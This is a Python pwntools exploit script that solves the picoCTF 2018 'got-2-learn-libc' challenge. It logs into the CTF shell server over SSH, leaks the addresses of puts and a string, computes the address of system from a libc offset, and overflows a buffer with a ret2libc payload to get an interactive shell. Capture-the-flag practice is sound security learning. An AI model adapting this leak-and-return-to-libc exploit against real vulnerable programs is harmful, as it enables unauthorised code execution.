#!/usr/bin/env python

#useful_string: 0x56557030 ==> \x30\x70\x55\56
#p system: 0xf7e13420 ==> \x20\x34\xe1\xf7 
#main: 0x00000803 ==> \x03\x08\x00\x00


from pwn import *

user = '*****'
pw = '********'

s = ssh(host = '2018shell1.picoctf.com', user=user, password=pw)
s.set_working_directory('/problems/got-2-learn-libc_3_6e9881e9ff61c814aafaf92921e88e33')
  
p = s.process('./vuln')


offset = -149504
lines =  p.recvuntil('Enter a string:').split('\n')

print lines
puts = int(lines[2].split(':')[1].strip()[2:], 16)
useful = int(lines[6].split(':')[1].strip()[2:], 16)

log.info('Puts in: 0x{:x}'.format(puts))
log.info('Useful string in: 0x{:x}'.format(useful))

system = puts + offset
#we add BBB because we are jumping to a build a new stack frame
payload = "A" * 160 + p32(system) + 'BBBB' + p32(useful)
p.sendline(payload)
p.interactive()

